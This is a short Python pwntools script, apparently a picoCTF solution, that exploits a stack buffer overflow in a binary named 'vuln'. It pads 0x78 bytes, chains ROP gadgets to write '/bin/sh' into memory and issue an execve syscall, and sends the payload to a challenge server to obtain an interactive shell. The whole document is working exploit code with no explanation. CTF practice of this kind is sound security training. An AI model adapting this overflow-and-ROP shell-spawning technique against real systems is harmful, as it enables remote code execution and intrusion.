from pwn import *
ELF = (r'./vuln')

syscall_num = 59 #sys_execve
num = 84
offset = 0x78

write_gadget = b''


pop_rsi = p64(0x410ca3) #pop rsi ; ret -> rsi - bin_sh_addr
bin_sh_addr = p64(0x00000000006ba0e0)
pop_rax = p64(0x4163f4) #pop rax ; ret -> rax = bin_sh
bin_sh = b'/bin/sh\x00'
mov_rsi_rax = p64(0x47ff91) #mov qword ptr [rsi], rax ; ret
#xor_rax = p64(0x445950) #xor rax, rax ; ret
write = pop_rsi + bin_sh_addr + pop_rax + bin_sh + mov_rsi_rax

#setup syscall

pop_rdi = p64(0x400696) #pop rdi ; ret 
pop_rsi = pop_rsi       #pop rsi ; ret
pop_rdx = p64(0x44a6b5) #pop rdx ; ret
syscall = p64(0x40137c) #syscall

syscall_f = b"" + pop_rax + p64(syscall_num) + pop_rdi + bin_sh_addr + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + syscall

payload = b'a'*offset + write + syscall_f

r = remote('jupiter.challenges.picoctf.org',51462)
r.sendline(f"{num}")
r.sendline(payload)
r.interactive()